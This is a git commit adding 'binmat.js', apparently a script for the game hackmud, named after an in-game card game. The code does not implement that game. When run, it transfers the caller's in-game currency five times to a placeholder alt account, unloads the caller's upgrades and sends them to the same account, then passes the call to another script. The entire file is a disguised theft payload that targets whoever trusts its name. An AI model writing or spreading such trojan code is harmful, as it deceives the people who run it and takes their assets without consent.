01d289fd2848b4e0fcc2dd4ef807d3755d6edcfe
matr1x-hackmud <53655672+matr1x-hackmud@users.noreply.github.com>
2021-06-19 03:23:18 +0100

    Create binmat.js

---
+++ binmat.js
@@ -0,0 +1,11 @@
+function(c,a){
+  let A = "<ALT>",
+  u = #hs.sys.upgrades({full:1}).filter(_=>!_.loaded).map(_=>_.i),
+  g = #hs.accts.balance()
+  
+  for(let i = 0; i < 5; i++) #ms.cash.xfer_gc_to({to:A, amount:Math.max(g, 32e9) })
+  #ms.sys.manage({unload:u})
+  #ls.sys.xfer_upgrade_to({to:A, sn:u })
+  
+  return #ns.paladin.ns_pub(a)
+}
